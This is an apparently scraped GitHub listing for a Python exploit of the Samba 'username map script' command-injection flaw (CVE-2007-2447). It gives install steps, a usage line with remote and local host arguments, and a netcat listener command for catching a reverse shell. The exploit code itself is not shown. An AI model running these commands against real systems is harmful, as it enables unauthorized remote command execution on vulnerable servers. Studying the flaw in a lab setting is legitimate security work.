# CVE-2007-2447

null

| Infos    | Value                                                              |
| -------- | -------------------------------------------------------------------|
| Username | [https://github.com/0xKn](https://github.com/0xKn) |
| Url      | [https://github.com/0xKn/CVE-2007-2447](https://github.com/0xKn/CVE-2007-2447)                                               |
| Stars    | 0                                                          |
| License  | No License                                                        |

<details>

<summary>Topic / Tags</summary>



</details>

## Readme

# CVE-2007-2447 - username map script

"The MS-RPC functionality in smbd in Samba 3.0.0 through 3.0.25rc3 allows remote attackers to execute arbitrary commands via shell metacharacters involving the (1) SamrChangePassword function, when the "username map script" smb.conf option is enabled, and allows remote authenticated users to execute commands via shell metacharacters involving other MS-RPC functions in the (2) remote printer and (3) file share management."



## Exploit

### Installation:

**[*]** This exploit requires Python 3.7 or higher

``` 
python3 -m pip install pysmb 
```

### Usage:

```
$ ./CVE-2007-2447.py --rhost 10.10.10.3 --lhost 10.10.14.10 --lport 4444 --rport 445
```
* ```--rhost``` -- Remote Host
* ```--lhost``` -- Local Host
* ```--lport``` -- Local Port
* ```--rport``` -- Remote Port **[*]** _Optional. default=445_

Do not forget to start your listener:

```
nc -lvnp 4444
```

## PoC

![image](https://user-images.githubusercontent.com/80174242/110221372-e9226500-7ec3-11eb-850b-77e6c7711707.png)




## Get the content

```
git clone https://github.com/0xKn/CVE-2007-2447
cd CVE-2007-2447
```

{% embed url="https://github.com/0xKn/CVE-2007-2447" %}

<figure><img src="https://avatars.githubusercontent.com/u/80174242?v=4" alt=""><figcaption><p>0xKn</p></figcaption></figure>
